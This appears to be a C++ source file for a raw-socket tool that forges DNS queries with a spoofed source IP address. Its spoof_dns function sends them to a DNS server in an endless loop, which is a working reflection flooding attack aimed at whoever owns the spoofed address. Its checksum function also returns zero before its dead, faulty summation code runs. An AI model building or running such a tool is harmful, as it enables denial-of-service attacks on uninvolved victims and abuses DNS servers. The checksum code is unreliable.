#include "my_utils.h"

unsigned short utils::checksum(void *addr, int len) {
  // FIXME
  return 0;
  int nleft = len;
  int sum = 0;
  char *w = (char *)addr;
  unsigned short answer = 0;

  while (nleft > 1) {
    sum += *w++;
    nleft -= 2;
  }

  if (nleft == 1) {
    *(unsigned char *)(&answer) = *(unsigned char *)w;
    sum += answer;
  }

  sum = (sum >> 16) + (sum & 0xFFFF);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}

utils::IP::IP() {
    ip.ip_v = 0x4;
    ip.ip_tos = 0x0;
    ip.ip_sum = 0x0;
}

utils::IP::IP(const char *src_addr, const char *dst_addr) {
    ip.ip_v = 0x4;
    ip.ip_tos = 0x0;
    ip.ip_sum = 0x0;
    ip.ip_src.s_addr = inet_addr(src_addr);
    ip.ip_dst.s_addr = inet_addr(dst_addr);
  }

  void utils::IP::set_header_len(int hl) { ip.ip_hl = hl; }

  void utils::IP::set_len(int len) { ip.ip_len = htons(len); }

  unsigned short utils::IP::get_len() { return ntohs(ip.ip_len); }

  struct ip *utils::IP::get_addr() {
    return &ip;
  }

  void utils::IP::set_id(int id) { ip.ip_id = htons(id); }

  void utils::IP::set_offset(int offset) { ip.ip_off = offset; }

  void utils::IP::set_ttl(int ttl) { ip.ip_ttl = ttl; }

  void utils::IP::set_proto(int p) { ip.ip_p = p; }

  void utils::IP::set_sum(unsigned short sum) { ip.ip_sum = sum; }

  void utils::UDP::set_port(unsigned short src_port, unsigned short dst_port) {
    header.uh_sport = htons(src_port);
    header.uh_dport = htons(dst_port);
  };
  void utils::UDP::set_data(void *data, uint16_t data_len) {
    this->data = data;
    this->data_len = data_len;
    header.uh_ulen = htons(sizeof(header) + data_len);
    header.uh_sum = 0;
  }
  std::tuple<char*, size_t> utils::UDP::gen_udp_packet(std::string src_addr, std::string dst_addr) {
    constexpr size_t IP_PSEUDO_HEAD_SIZE = sizeof(PseudoIPHeader);
    constexpr size_t UDP_HEAD_SIZE = sizeof(udphdr);
    header.uh_sum = 0;
    size_t padding = data_len % 2;
    size_t real_size = UDP_HEAD_SIZE + this->data_len;
    size_t ck_size =
        IP_PSEUDO_HEAD_SIZE + UDP_HEAD_SIZE + this->data_len + padding;
    char *tmp_packet = (char *)malloc(ck_size);
    std::memset(tmp_packet, 0, ck_size);
    PseudoIPHeader pseudo_header(src_addr, dst_addr, header.uh_ulen);
    memcpy(tmp_packet, &pseudo_header, IP_PSEUDO_HEAD_SIZE);
    memcpy(tmp_packet + IP_PSEUDO_HEAD_SIZE, &header, UDP_HEAD_SIZE);
    memcpy(tmp_packet + IP_PSEUDO_HEAD_SIZE + UDP_HEAD_SIZE, this->data,
           this->data_len);
    header.uh_sum = checksum(tmp_packet, ck_size);
    free(tmp_packet);
    tmp_packet = nullptr;
    char *packet = (char *)malloc(real_size);
    memcpy(packet, &header, UDP_HEAD_SIZE);
    memcpy(packet + UDP_HEAD_SIZE, this->data, this->data_len);
    return std::make_tuple(packet, real_size);
  }

const bool utils::is_bad_ipv4_addr(std::string address) {
  int32_t buf;
  return inet_pton(AF_INET, address.c_str(), &buf) != 1;
}
const bool utils::is_bad_ipv4_port(unsigned short port) {
  return !(port >= 0 && port <= 65535);
}

std::tuple<char*, size_t> utils::gen_question_from_domain_names(std::vector<std::string> domain_strings, std::vector<DNSQueryType> query_types) {
  // www.baidu.com|    n
  // 3www5baidu3com0   n+1
  size_t total_len = 0;
  std::vector<std::string> discrete_labels;
  for(int i = 0; i < domain_strings.size(); ++i) {
    size_t start = 0;
    for(int j = 0; j <= domain_strings[i].length(); ++j) {
      if(j == domain_strings[i].length() || domain_strings[i][j] == '.') {
        size_t len = j - start;
        total_len += len + 1;
        discrete_labels.emplace_back(domain_strings[i].substr(start, len));
        start = j + 1;
      }
    }
    total_len++; // '\0'
    total_len += 4; // query_type class
    discrete_labels.emplace_back("");
  }
  
  int16_t class_ = htons(1);
  size_t i = 0;
  size_t j = 0;
  char* questions_data = (char*)malloc(total_len);
  for(const auto & discrete_label : discrete_labels){
    int16_t query_type_ = htons(static_cast<int16_t>(query_types[i]));
    if(discrete_label.length()){
      questions_data[j] = discrete_label.length();
      j++;
      memcpy(questions_data + j, discrete_label.c_str(), discrete_label.length());
      j += discrete_label.length();
    } else {
      i++;
      questions_data[j] = '\0';
      j++;
      memcpy(questions_data + j, &query_type_, sizeof(query_type_));
      j += 2;
      memcpy(questions_data + j, &class_, sizeof(class_));
      j += 2;
    }
  }
  return std::make_tuple(questions_data, total_len);
}

void utils::spoof_dns(std::string source_spoof_ip_str, std::string dns_server_ip_str,
               unsigned short dns_server_port, std::vector<std::string> domain_strings,
               std::vector<DNSQueryType> query_types) {
  time_t seed = time(nullptr);
  srand(static_cast<unsigned int>(seed));
  unsigned char *packet;
  int sd;
  const int on = 1;
  struct sockaddr_in sockaddr;

  // IP header
  IP ip_pkt(source_spoof_ip_str.c_str(), dns_server_ip_str.c_str());
  ip_pkt.set_header_len(0x5);
  ip_pkt.set_id(12830);
  ip_pkt.set_offset(0x0);
  ip_pkt.set_ttl(64);
  ip_pkt.set_proto(IPPROTO_UDP);
  ip_pkt.set_sum(checksum((u_short *)ip_pkt.get_addr(), sizeof(struct ip)));

  // DNS
  int16_t identification = rand() % INT16_MAX;
  constexpr size_t DNS_IDENT_SIZE = 2;
  constexpr size_t DNS_HEADER_FLAG_SIZE = 2; // 2 bytes
  const size_t DNS_HEADER_SIZE = DNS_IDENT_SIZE + DNS_HEADER_FLAG_SIZE + 4 * sizeof(int16_t); 
  // identification(16 bits) flags(16 bits) number of questions(16 bits) number of answer(16 bits) number of autho answer(16 bits) additional answer(16 bits)
  int16_t questions_num = domain_strings.size();
  char* questions;
  size_t questions_size;
  int16_t dns_header_flags = 0;
  DNSReqHeader dns_header(identification, dns_header_flags, questions_num);
  std::tie(questions, questions_size) = gen_question_from_domain_names(domain_strings, query_types);
  uint16_t dns_data_len = sizeof(dns_header) + questions_size;
  char *dns_data = (char*)malloc(dns_data_len);
  memcpy(dns_data, &dns_header, sizeof(dns_header));
  memcpy(dns_data + sizeof(dns_header), questions, questions_size);

  // UDP
  UDP udp;
  udp.set_data(dns_data, dns_data_len);
  udp.set_port(54321, dns_server_port);
  char* dns_req_udp;
  int16_t dns_req_udp_len;
  std::tie(dns_req_udp, dns_req_udp_len) = udp.gen_udp_packet(source_spoof_ip_str, dns_server_ip_str);
  ip_pkt.set_len(20 + dns_req_udp_len);

  packet = (unsigned char *)malloc(ip_pkt.get_len());
  memcpy(packet, ip_pkt.get_addr(), sizeof(struct ip));
  memcpy(packet + 20, dns_req_udp, dns_req_udp_len);
  free(dns_req_udp);
  free(questions);
  questions = nullptr;
  dns_req_udp = nullptr;

  /*
  Create a raw socket so that kernel doesn't interfere
  with the headers of the custom packet.
  */

  if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
    perror("Couldn't create raw socket");
    exit(1);
  }

  if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
    perror("setsockopt() failed");
    exit(1);
  }

  memset(&sockaddr, 0, sizeof(sockaddr));
  sockaddr.sin_family = AF_INET;
  sockaddr.sin_addr.s_addr = inet_addr(dns_server_ip_str.c_str());

  // Send the packet
  while(1)
    if (sendto(sd, packet, ip_pkt.get_len(), 0, (struct sockaddr *)&sockaddr,
               sizeof(struct sockaddr)) < 0) {
      perror("Packet couldn't be sent");
      exit(1);
    }
  close(sd);
}
